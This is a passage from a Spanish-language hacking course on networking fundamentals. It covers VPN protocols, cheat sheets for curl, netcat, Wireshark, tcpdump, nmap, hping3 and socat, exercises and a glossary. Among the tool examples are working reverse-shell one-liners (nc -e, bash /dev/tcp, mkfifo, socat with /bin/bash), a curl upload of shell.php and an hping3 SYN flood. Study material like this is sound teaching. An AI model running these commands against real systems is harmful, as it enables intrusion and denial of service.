- Corre sobre TCP o UDP (puerto 1194 por defecto)
- Usa [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) para autenticacion e intercambio de claves
- Soporta PKI (certificados cliente/servidor)
- Modos: routed (tun) o bridged (tap)
- Puede correr sobre TCP 443 para evadir firewalls

#### PPTP (Point-to-Point Tunneling Protocol)
Viejo, inseguro, NO USAR.
- [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) MPPE (MS-CHAPv2) roto
- Autenticacion MS-CHAPv2 vulnerable a ataques de [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario)
- Se puede crackear en segundos con herramientas como asleap
- Puerto TCP 1723 + GRE ([protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) 47)

#### L2TP/IPSec
L2TP no cifra por si mismo, se combina con IPSec para cifrado.
- Puerto UDP 1701 (L2TP) + UDP 500/4500 (IPSec)
- Nat Traversal: UDP 4500 para IPSec detras de NAT
- Mas seguro que PPTP pero mas pesado que WireGuard

#### VPN en Pentesting

- **IPSec scanning:** ike-scan para enumerar VPN gateways
- **PPTP [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas):** asleap, chapcrack para MS-CHAPv2
- **OpenVPN leak:** verificar que no haya DNS leak o IP leak
- **VPN filter bypass:** usar puertos permitidos (TCP 443) para VPN
- **VPN detection:** [nmap](../raw/nm4p.md) puede detectar servicios VPN en puertos comunes
- **IKE Aggressive Mode Pre-Shared Key cracking:** ike-scan + psk-crack

---

## Herramientas de [red](../raw/r3d3s-f0nd4m3nt0s.md)

### curl

curl es el cuchillo suizo de las transferencias sobre protocolos de red. Indispensable para pentesting web.

```bash
# GET basico
curl http://target.com/

# Mostrar solo headers (-I = HEAD request)
curl -I http://target.com/

# Mostrar todo (headers + body, verbose)
curl -v http://target.com/

# POST con datos
curl -X POST -d "user=admin&pass=1234" http://target.com/login

# POST con JSON
curl -X POST -H "Content-Type: application/json" -d "{\"user\":\"admin\"}" http://target.com/api

# Seguir redirecciones (-L)
curl -L http://target.com/

# Guardar output en archivo (-o)
curl -o output.html http://target.com/

# Usar proxy
curl -x http://127.0.0.1:8080 http://target.com/
curl -x socks5://127.0.0.1:9050 http://target.com/

# Cookie file
curl -c cookies.txt -b cookies.txt http://target.com/

# Custom headers
curl -H "User-Agent: Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" http://target.com/

# Basic Auth
curl -u admin:password http://target.com/admin

# Timeout y max time
curl --connect-timeout 5 --max-time 10 http://target.com/

# Ignorar errores SSL (para pentesting)
curl -k https://target.com/

# Especificar ciphers TLS
curl --ciphers DEFAULT:!DH https://target.com/

# Enviar archivo via PUT
curl -X PUT -T shell.php http://target.com/uploads/shell.php

# HTTP/2
curl --http2 https://target.com/

# DNS over HTTPS
curl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=google.com&type=A'
```

### [netcat](../raw/r3v3rs3-sh3lls.md#netcat) / ncat

Netcat es la navaja suiza del [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip). Permite leer y escribir datos a traves de la red.

```bash
# Escuchar conexiones entrantes (servidor)
nc -lvnp 4444
# -l: listen, -v: verbose, -n: no DNS, -p: puerto

# Conectar a un puerto (cliente)
nc -vn 192.168.1.100 80

# Transferir archivo (receptor)
nc -lvnp 4444 > received_file.txt

# Transferir archivo (emisor)
nc -vn 192.168.1.100 4444 < local_file.txt

# Banner grabbing
echo "" | nc -vn 192.168.1.100 22

# Reverse shell basica (victima)
nc -e /bin/sh 192.168.1.50 4444
# (La opcion -e no siempre esta disponible, es de ncat o de netcat-openbsd)

# Reverse shell sin -e (bash)
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1

# Reverse shell con mkfifo (mas estable)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 4444 >/tmp/f

# Escaneo de puertos basico
nc -zv 192.168.1.100 20-100
# -z: zero I/O (solo scan), -v: verbose

# ncat (version mejorada, parte de nmap)
ncat -lvnp 4444 --ssl  # con cifrado TLS
ncat -lvnp 4444 --keep-open  # acepta multiples conexiones
ncat -lvnp 4444 --allow 192.168.1.0/24  # solo de esa red
ncat -lvnp 4444 --chat  # servidor de chat multiple
```

### [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark)

Wireshark es el analizador de paquetes definitivo. Captura todo el trafico de red en tiempo real.

#### Filtros de captura (BPF - Berkeley Packet Filter)

```bash
# Solo trafico de/para una IP
host 192.168.1.100

# Solo trafico de un puerto
port 80

# Solo trafico a un puerto especifico
dst port 443

# Combinaciones
host 192.168.1.100 and port 80
host 192.168.1.100 or host 192.168.1.200

# Solo trafico UDP o TCP
udp
tcp

# Red completa
net 192.168.1.0/24

# Excluir trafico
not host 192.168.1.1
```

#### Filtros de visualizacion (Display Filters)

```bash
# Por IP
ip.src == 192.168.1.100
ip.dst == 8.8.8.8
ip.addr == 192.168.1.100  # src OR dst

# Por puerto TCP/UDP
tcp.port == 80
udp.port == 53
tcp.srcport == 443
tcp.dstport == 8080

# Por protocolo
http
dns
arp
icmp
tcp
udp
tls

# HTTP especifico
http.request
http.response
http.request.method == "POST"
http.response.code == 404
http.host == "target.com"

# DNS
dns.qry.name == "google.com"
dns.flags.response == 1
dns.a
dns.aaaa

# TCP flags
tcp.flags.syn == 1
tcp.flags.reset == 1
tcp.flags.fin == 1

# Follow stream (seguir conversacion)
# Click derecho en un paquete -> Follow -> TCP/UDP/HTTP Stream
# Muestra toda la conversacion como texto

# Combinaciones logicas
http and ip.src == 192.168.1.100
dns or icmp
tcp.port == 80 and !(ip.addr == 192.168.1.1)
```

### [tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump)

tcpdump es el sniffer de linea de comandos. Ligero y rapido, ideal para servidores sin GUI.

```bash
# Capturar en interfaz (-i)
tcpdump -i eth0
tcpdump -i any  # todas las interfaces

# Mostrar nombres de host (-n: no DNS, -nn: no DNS ni puertos)
tcpdump -n
tcpdump -nn

# Guardar a archivo (-w) y leer (-r)
tcpdump -w captura.pcap
tcpdump -r captura.pcap
tcpdump -r captura.pcap -nn  # leer sin DNS

# Numero de paquetes (-c)
tcpdump -c 100

# Mostrar mas detalle (-v, -vv, -vvv)
tcpdump -v
tcpdump -vv
tcpdump -vvv

# Capturar puerto especifico
tcpdump port 80
tcpdump port 53
tcpdump portrange 1-1024

# Capturar por protocolo
tcpdump tcp
tcpdump udp
tcpdump icmp
tcpdump arp

# Capturar por host
tcpdump host 192.168.1.100
tcpdump src host 192.168.1.100
tcpdump dst host 8.8.8.8

# Combinaciones
tcpdump -i eth0 -nn port 80 and host 192.168.1.100
tcpdump -i any -nn -w captura.pcap not port 22
tcpdump -i eth0 -nn -c 1000 port 53 or port 80

# Mostrar contenido hex de paquetes (-X)
tcpdump -X -r captura.pcap

# Capturar con buffer pequeno (-s)
tcpdump -s 0  # paquete completo (default 65535)
tcpdump -s 256  # solo primeros 256 bytes (suficiente para headers)
```

### [nmap](../raw/nm4p.md) (basico)

nmap ya tiene su propio tutorial dedicado. Aca van los basics que necesitas saber.

```bash
# Ping sweep (descubrir hosts vivos)
nmap -sn 192.168.1.0/24

# SYN scan (stealth, requiere root)
nmap -sS 192.168.1.100

# TCP connect scan (sin root)
nmap -sT 192.168.1.100

# UDP scan (lento)
nmap -sU 192.168.1.100

# Escaneo de puertos especificos
nmap -p 80,443,8080 192.168.1.100
nmap -p 1-1000 192.168.1.100
nmap -p- 192.168.1.100  # todos los puertos (65535)

# Deteccion de version de servicios
nmap -sV 192.168.1.100

# Deteccion de SO
nmap -O 192.168.1.100

# Todo en uno (default scan)
nmap -A 192.168.1.100

# Evasion
nmap -f  # fragmentacion de paquetes
nmap -D 192.168.1.10,192.168.1.20  # decoys
nmap -T0  # paranoid (muy lento)
nmap --source-port 53  # usar puerto origen 53
```

### Otras herramientas utiles

**hping3:** Construccion de paquetes custom ([tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp), [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp), ICMP). Ideal para evasion y pruebas de [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls).
```bash
hping3 -S 192.168.1.100 -p 80  # SYN a puerto 80
hping3 -S 192.168.1.100 -p 80 --flood  # SYN flood
hping3 --icmp 192.168.1.100  # ICMP ping
hping3 -S 192.168.1.100 -p 80 --traceroute  # traceroute via TCP
```

**ngrep:** grep para la red. Combina tcpdump con expresiones regulares.
```bash
ngrep -d eth0 'POST' port 80
ngrep -d any 'password' port 80
ngrep -d eth0 -W byline 'user|pass' tcp
```

**[socat](../raw/r3v3rs3-sh3lls.md#socat):** Como netcat pero con esteroides. Multiplexa, fork, [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)), UNIX sockets, etc.
```bash
# Forwarder de puertos
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Reverse shell con SSL
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork EXEC:/bin/bash

# Tunel UDP a TCP
socat UDP-LISTEN:53,fork TCP:192.168.1.100:53
```

---

*Fin del documento. Esto es el piso, no el techo. Todo lo que venga despues se apoya en estos conceptos. Estudialo, practicalo, rompelo.*

## Ejercicios Practicos

### Nivel 1: OSI

1. Identifica en que capa OSI ocurre cada uno de estos ataques:
   - [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing)
   - [sql injection](../raw/w3b-h4ck1ng.md#sql-injection)
   - SYN flood
   - [bGP](../raw/r3d3s-4v4nz4d4s.md#bgp) hijacking
   - [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) stripping
   - MAC flooding
   - Session hijacking

2. Describi paso a paso (por capas OSI) que pasa cuando haces ping a 8.8.8.8.

3. Que PDU se usa en cada capa? Enumera bits, frames, paquetes, segmentos, datos y a que capa pertenece cada uno.

### Nivel 2: [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip)

1. Dibuja el [handshake](../raw/w1f1-4tt4cks.md#handshake) [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) de 3 vias con numeros de secuencia (1000 y 5000).
2. Que significan los flags SYN, ACK, FIN, RST?
3. Cual es la diferencia entre cwnd y rwnd?
4. Explica el ataque SYN flood. Como mitigarlo?
5. Cual es la diferencia entre TCP y [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp)? Daa 3 ejemplos de uso de cada uno.
6. Cual es el proposito de [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp)? Como funciona [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing)?

### Nivel 3: [http](../raw/r3d3s-f0nd4m3nt0s.md#http)

1. Que significa 401 vs 403? Por que es importante en pentesting?
2. Cual es la diferencia entre PUT y POST? Cual es idempotente?
3. Que es Host Header Injection? Como se explota?
4. Que headers de seguridad protegen contra [xss](../raw/w3b-h4ck1ng.md#xss)? Contra clickjacking?
5. Explica la diferencia entre SameSite Lax y Strict.
6. Que es CORS? Que significa Access-Control-Allow-Origin: *?

### Nivel 4: [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) y Subnetting

1. Explica el recorrido completo de una consulta DNS (stub a authoritative).
2. Que es un zone transfer (AXFR)? Por que es peligroso?
3. Que son los records A, AAAA, MX, CNAME, TXT, NS, PTR, SOA?
4. Calcula la mascara, network, broadcast y hosts utiles de 172.16.5.0/27.
5. Tenes 10.0.0.0/16. Necesitas 10 subredes. Que mascara usas? Cuantos hosts por [subred](../raw/r3d3s-f0nd4m3nt0s.md#subredes)?

### Nivel 5: Practico

1. Usa curl para hacer un POST con JSON a una API local.
2. Usa [netcat](../raw/r3v3rs3-sh3lls.md#netcat) para crear un servidor que escuche en el [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 9999 y reciba un archivo.
3. Captura trafico con [tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump) en tu interfaz principal y filtra solo HTTP.
4. Abre la captura en [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) y filtra por [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip).src=tu_ip y http.request.
5. Usa [nmap](../raw/nm4p.md) para escanear los puertos abiertos de tu propio equipo (localhost).
6. Configura un [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) reverso con nginx que redirija de puerto 8080 a 80.
7. Identifica el SO de un host remoto por su TTL en una captura Wireshark.
8. Usa dig para hacer un trace completo de resolucion de google.[com](../raw/w1n-s9bsyst3ms.md#com).
9. Crea una regla de iptables que bloquee todo el trafico entrante excepto SSH.
10. Encuentra el path MTU entre tu maquina y google.com usando ping con DF.

### Cheatsheet Rapido

| Concepto | Comando/Valor |
|----------|---------------|
| Ver tabla ARP | `arp -a` |
| Ver tabla de ruteo | `route print` (Win), `ip route` (Linux) |
| Ver configuracion IP | `ipconfig /all` (Win), `ip addr` (Linux) |
| Ver conexiones activas | `netstat -an` (Win), `ss -tuln` (Linux) |
| Flushear DNS cache | `ipconfig /flushdns` (Win), `resolvectl flush-caches` (Linux) |
| Testear puerto abierto | `nc -zv IP PUERTO` |
| Escaneo rapido nmap | `nmap -sS -T4 -A IP` |
| Consulta DNS | `dig google.com`, `nslookup google.com` |
| Traceroute | `tracert IP` (Win), `traceroute IP` (Linux) |
| Capturar trafico | `tcpdump -i eth0 -nn port 80` |
| Ver puerto abierto | `netstat -ano | findstr :443` (Win) |
| TTL por SO | Linux=64, Windows=128, Cisco=255 |
| MTU ethernet | 1500 |
| MSS ethernet | 1460 |
| Puertos comunes | 22(SSH), 80(HTTP), 443([https](../raw/r3d3s-f0nd4m3nt0s.md#https)), 445([smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)) |
| Rango efimero Linux | 32768-60999 |
| Rango efimero Windows | 49152-65535 |
| SOA serial format | YYYYMMDDNN |
| DoH Cloudflare | https://cloudflare-dns.com/dns-query |
| DoH Google | https://dns.google/dns-query |

---

*Este documento es material de estudio para el curso de hacking. No uses estos conocimientos para actividades ilegales. El conocimiento es poder, pero el poder conlleva responsabilidad.*

## Glosario Rapido

**ACK:** Acknowledgment. Paquete [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) que confirma recepcion de datos.
**ALPN:** Application-Layer Protocol Negotiation. Negocia [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/2 o [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/1.1 en [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls).
**[arp](../raw/r3d3s-f0nd4m3nt0s.md#arp):** Address Resolution Protocol. Mapea [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) a MAC en una LAN.
**ASN:** Autonomous System Number. Identificador unico de [red](../raw/r3d3s-f0nd4m3nt0s.md) en [bGP](../raw/r3d3s-4v4nz4d4s.md#bgp).
**BGP:** Border Gateway Protocol. Protocolo de ruteo principal de Internet.
**CIDR:** Classless Inter-Domain Routing. Notacion IP/prefix para subredes.
**CNAME:** Canonical Name. Alias [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) de un dominio a otro.
**CORS:** Cross-Origin Resource Sharing. Controla acceso cross-origen en navegadores.
**CSP:** Content Security Policy. Header de seguridad contra [xss](../raw/w3b-h4ck1ng.md#xss).
**[csrf](../raw/w3b-h4ck1ng.md#csrf):** Cross-Site Request Forgery. Ataque que fuerza al usuario a ejecutar acciones no deseadas.
**cwnd:** Congestion Window. Ventana de congestion TCP.
**[dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp):** Dynamic Host Configuration Protocol. Asigna [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) automaticamente.
**DNAT:** Destination [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat). Cambia IP destino de paquetes entrantes.
**DNS:** Domain Name System. Traduce nombres a IPs.
**DoH:** DNS over [https](../raw/r3d3s-f0nd4m3nt0s.md#https). DNS [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) via HTTP/2.
**DoS:** Denial of Service. Ataque que deja un servicio inaccesible.
**DORA:** Discover, Offer, Request, ACK. [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) DHCP de 4 pasos.
**DSCP:** Differentiated Services Code Point. QoS en IP.
**ECN:** Explicit Congestion Notification. Notificacion de congestion en IP.
**ESP:** Encapsulating Security [payload](../raw/m3t4spl01t.md#payloads). Cifrado y [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) en IPSec.
**FTP:** File Transfer Protocol. Transferencia de archivos ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 21).
**GARP:** Gratuitous ARP. ARP anunciando propia IP, usado en spoofing.
**HOL:** Head-of-Line blocking. Problema de TCP donde un paquete perdido bloquea los demas.
**HPACK:** Header Compression para HTTP/2.
**HSTS:** HTTP Strict Transport Security. Header que fuerza HTTPS.
**IANA:** Internet Assigned Numbers Authority. Asigna puertos, protocolos, etc.
**ICMP:** Internet Control Message Protocol. Ping, traceroute, errores.
**IKE:** Internet Key Exchange. Intercambio de claves en IPSec.
**IPSec:** IP Security. Suite de protocolos para cifrar IP.
**ISN:** Initial Sequence Number. Numero de secuencia inicial en TCP.
**LLC:** Logical Link Control. Subcapa de capa 2 (OSI).
**MAC:** Media Access Control. Direccion fisica de 48 bits.
**[mitm](../raw/m1tm-m0b1l3.md):** [man-in-the-middle](../raw/m1tm-m0b1l3.md). Ataque donde el atacante intercepta comunicacion.
**MSS:** Maximum Segment Size. Maximo de datos TCP en un segmento.
**MTU:** Maximum Transmission Unit. Tamano maximo de paquete en un enlace.
**NAT:** Network Address Translation. Traduce IPs entre [redes](../raw/r3d3s-f0nd4m3nt0s.md).
**NDP:** Neighbor Discovery Protocol. Reemplazo de ARP en IPv6.
**NTP:** Network Time Protocol. Sincronizacion de hora (puerto 123).
**NXDOMAIN:** Non-Existent Domain. Respuesta DNS que indica que el dominio no existe.
**OCSP:** Online Certificate Status Protocol. Verifica revocacion de certificados.
**OSI:** Open Systems Interconnection. Modelo de 7 capas para redes.
**OUI:** Organizationally Unique Identifier. Identificador de fabricante en MAC.
**PAT:** Port Address Translation. NAT con puertos.
**PDU:** Protocol Data Unit. Unidad de datos en cada capa OSI.
**PFS:** Perfect Forward Secrecy. Claves de sesion efimeras (no se pueden descifrar despues).
**PMTUD:** Path MTU Discovery. Descubre la MTU del camino completo.
**QUIC:** Quick [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) Internet Connections. Transporte de HTTP/3 sobre [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp).
**RDP:** Remote Desktop Protocol. Escritorio remoto de Windows (puerto 3389).
**RTO:** Retransmission Timeout. Tiempo de espera para retransmitir TCP.
**rwnd:** Receiver Window. Ventana del receptor en TCP.
**SACK:** Selective Acknowledgment. ACK selectivo de TCP.
**SLAAC:** Stateless Address Autoconfiguration. Autoconfiguracion IPv6.
**[smb](../raw/w1nd0ws-p0st3xpl01t.md#smb):** Server Message Block. Protocolo de archivos e impresion de Windows.
**SMTP:** Simple Mail Transfer Protocol. Envio de email (puerto 25).
**SNAT:** Source NAT. Cambia IP origen de paquetes salientes.
**SNI:** Server Name Indication. Extension TLS para indicar el dominio.
**SNMP:** Simple Network Management Protocol. Monitoreo de red (puerto 161).
**SOA:** Start of Authority. Record DNS con informacion de zona.
**SOP:** Same-Origin Policy. Politica de seguridad del [navegador](../raw/br0ws3r-3xpl01t4t10n.md).
**SPF:** Sender Policy Framework. Verifica servidores de email autorizados.
**SSH:** Secure Shell. Acceso remoto seguro (puerto 22).
**[ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls):** Secure Sockets Layer. Predecesor de TLS (obsoleto).
**SYN:** Synchronize. Flag TCP para iniciar conexion.
**TCP:** Transmission Control Protocol. Protocolo confiable orientado a conexion.
**TLD:** Top-Level Domain. .[com](../raw/w1n-s9bsyst3ms.md#com), .org, .ar, etc.
**TLS:** Transport Layer Security. Cifrado de comunicaciones.
**TTL:** Time To Live. Limite de saltos IP o tiempo de cache DNS.
**UDP:** User Datagram Protocol. Protocolo no confiable sin conexion.
**VLSM:** [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) Length Subnet Mask. Mascaras de [subred](../raw/r3d3s-f0nd4m3nt0s.md#subredes) de tamanos variables.
**[vpn](../raw/4n0n1m4t0.md#vpn):** Virtual Private Network. Red privada virtual.
**WAF:** Web Application [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls). [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) de aplicacion web (capa 7).
**XSS:** cross-site [scripting](../raw/w3b-h4ck1ng.md#xss). Inyeccion de scripts en paginas web.

---

| Concepto | Explicacion |
|----------|------------|
| TTL 64 | Linux, macOS, la mayoria de los Unix modernos |
| TTL 128 | Windows (7, 8, 10, 11, Server) |
| TTL 255 | Routers Cisco, Solaris, AIX, algunos dispositivos de red |
| MTU 1500 | Ethernet estandar |
| MTU 1492 | PPPoE (ADSL, fibra con PPPoE) |
| MTU 9000 | Jumbo frames (datacenter, storage) |
| Puerto 80 | HTTP (sin cifrar) |
| Puerto 443 | HTTPS (cifrado con TLS) |
| Puerto 22 | SSH (acceso remoto seguro) |
| Puerto 53 | DNS (resolucion de nombres) |

---

*Fin del documento. 3000+ lineas de fundamentos de redes para hacking. Recorda: la red es el medio, entenderla es la clave.*


